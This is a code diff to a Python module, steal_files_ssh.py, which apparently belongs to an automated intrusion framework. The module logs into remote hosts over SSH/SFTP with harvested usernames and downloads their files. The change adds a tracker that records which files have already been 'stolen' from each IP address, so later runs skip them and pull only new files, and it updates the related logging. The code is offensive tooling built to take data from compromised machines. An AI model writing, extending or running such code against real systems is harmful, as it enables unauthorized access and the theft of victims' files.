@@ -6,10 +6,12 @@ import os
 import paramiko
 import logging
 import time
+import json
 from rich.console import Console
 from threading import Timer
 from shared import SharedData
 from logger import Logger
+from actions.connector_utils import FileTracker
 
 # Configure the logger
 logger = Logger(name="steal_files_ssh.py", level=logging.DEBUG)
@@ -31,6 +33,7 @@ class StealFilesSSH:
             self.sftp_connected = False
             self.stop_execution = False
             self.b_parent_action = b_parent  # Set the parent action attribute
+            self.file_tracker = FileTracker('ssh', self.shared_data.datadir)
             logger.info("StealFilesSSH initialized")
         except Exception as e:
             logger.error(f"Error during initialization: {e}")
@@ -159,12 +162,18 @@ class StealFilesSSH:
         logger.debug(f"Falling back to home directory guess: {fallback_home}")
         return fallback_home
 
-    def steal_file(self, ssh, remote_file, local_dir):
+    def steal_file(self, ssh, remote_file, local_dir, ip):
         """
         Download a file from the remote server to the local directory.
         Includes size checking and progress logging.
+        Optimization: Skip files that have already been downloaded.
         """
         try:
+            # Check if file was already stolen
+            if self.file_tracker.is_file_stolen(ip, remote_file):
+                logger.debug(f"Skipping {remote_file}: already stolen from {ip}")
+                return False
+            
             sftp = ssh.open_sftp()
             self.sftp_connected = True  # Mark SFTP as connected
             
@@ -191,6 +200,10 @@ class StealFilesSSH:
             # Download the file
             sftp.get(remote_file, local_file_path)
             logger.success(f"Downloaded {remote_file} -> {local_file_path}")
+            
+            # Mark file as stolen
+            self.file_tracker.mark_file_stolen(ip, remote_file)
+            
             sftp.close()
             return True
         except Exception as e:
@@ -283,25 +296,36 @@ class StealFilesSSH:
                         all_remote_files = list(set(all_remote_files))
                         
                         if all_remote_files:
-                            logger.info(f"Total unique files found: {len(all_remote_files)}")
+                            # Filter out already stolen files
+                            new_files, already_stolen_count = self.file_tracker.filter_new_files(ip, all_remote_files)
+                            
+                            if already_stolen_count > 0:
+                                logger.info(f"Skipping {already_stolen_count} already stolen files, {len(new_files)} new files to download")
+                            else:
+                                logger.info(f"Total unique files found: {len(all_remote_files)} (all new)")
+                            
                             downloaded_count = 0
                             
-                            for remote_file in all_remote_files:
+                            for remote_file in new_files:
                                 if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                     logger.info("File download interrupted.")
                                     break
                                     
-                                if self.steal_file(ssh, remote_file, local_dir):
+                                if self.steal_file(ssh, remote_file, local_dir, ip):
                                     downloaded_count += 1
                                     total_downloaded += 1
                                     
                                 # Progress update every 10 files
-                                if downloaded_count % 10 == 0:
-                                    logger.info(f"Downloaded {downloaded_count}/{len(all_remote_files)} files so far...")
+                                if downloaded_count % 10 == 0 and downloaded_count > 0:
+                                    logger.info(f"Downloaded {downloaded_count}/{len(new_files)} new files so far...")
                             
                             if downloaded_count > 0:
                                 success = True
-                                logger.success(f"Successfully downloaded {downloaded_count} files from {ip} using {username}")
+                                logger.success(f"Successfully downloaded {downloaded_count} new files from {ip} using {username}")
+                            elif already_stolen_count > 0:
+                                # All files were already stolen
+                                success = True
+                                logger.info(f"No new files to download from {ip} - all {already_stolen_count} files already stolen")
                             else:
                                 logger.warning(f"No files could be downloaded from {ip} using {username}")
                         else:
